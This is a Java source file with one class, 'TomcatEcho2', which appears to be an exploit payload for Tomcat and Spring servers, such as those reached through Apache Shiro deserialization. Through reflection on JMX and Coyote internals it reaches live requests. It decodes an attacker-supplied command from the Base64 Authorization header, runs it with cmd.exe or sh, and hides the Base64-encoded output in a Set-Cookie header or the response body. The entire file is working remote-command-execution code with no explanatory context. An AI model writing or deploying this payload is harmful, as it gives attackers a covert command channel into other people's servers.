

/**
 * @ClassName: tomcat2
 * @Description: TODO
 * @Author: Summer
 * @Date: 2022/1/19 11:36
 * @Version: v1.0.0
 * @Description:
 **/
public class TomcatEcho2 {
    public TomcatEcho2() throws Exception {
        try {
            javax.management.MBeanServer var2 = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            String var3 = var2.queryNames(new javax.management.ObjectName("Catalina:type=GlobalRequestProcessor,name=*http*"), (javax.management.QueryExp)null).iterator().next().toString();
            java.util.regex.Matcher var4 = java.util.regex.Pattern.compile("Catalina:(type=.*),(name=.*)").matcher(var3);
            if (var4.find()) {
                var3 = var4.group(2) + "," + var4.group(1);
            }
            java.lang.reflect.Field var5 = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            var5.setAccessible(true);
            Object var6 = var5.get(var2);
            var5 = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            var5.setAccessible(true);
            java.util.HashMap var7 = (java.util.HashMap)var5.get(var6);
            var6 = ((java.util.HashMap)var7.get("Catalina")).get(var3);
            var5 = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            var5.setAccessible(true);
            var6 = var5.get(var6);
            var5 = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            var5.setAccessible(true);
            java.util.ArrayList var8 = (java.util.ArrayList)var5.get(var6);
            var5 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            var5.setAccessible(true);
            for(int var9 = 0; var9 < var8.size(); ++var9) {
                org.apache.coyote.Request var10 = (org.apache.coyote.Request)var5.get(var8.get(var9));
                String var11 = var10.getHeader("Authorization");
                String s = var10.getHeader("Host");
                if (var11 != null) {
                    var11 = org.apache.shiro.codec.Base64.decodeToString(var11.replaceAll("Basic ", ""));
                    java.io.InputStream var12 = Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", var11} : new String[]{"sh", "-c", var11}).getInputStream();
                    java.util.Scanner var13 = (new java.util.Scanner(var12)).useDelimiter("\\a");
                    String var14 = var13.hasNext() ? var13.next() : "";
                    var10.getResponse().setStatus(200);
                    var10.getResponse().addHeader("Host", s);
                    var10.getResponse().addHeader("Set-Cookie", "$$$"+org.apache.shiro.codec.Base64.encodeToString(var14.getBytes())+"$$$");
                    break;
                }
            }
        } catch (Exception var25) {
        }
        javax.servlet.http.HttpServletRequest var16;
        javax.servlet.http.HttpServletResponse var21 = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getResponse();
        var16 = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
        String var17 = var16.getHeader("Authorization");
        String s = var16.getHeader("Host");
        if (var17 != null) {
            var17 = org.apache.shiro.codec.Base64.decodeToString(var17.replaceAll("Basic ", ""));
            java.io.InputStream var18 = Runtime.getRuntime().exec(var17).getInputStream();
            java.util.Scanner var19 = (new java.util.Scanner(var18)).useDelimiter("\\a");
            String var20 = var19.hasNext() ? var19.next() : "";
            var21.setStatus(200);
            var21.addHeader("Host", s);
            var21.getWriter().println("$$$" +org.apache.shiro.codec.Base64.encodeToString( var20.getBytes()) + "$$$");
        }else {
            var21.setStatus(200);
            var21.addHeader("Host", s);
        }


    }

}
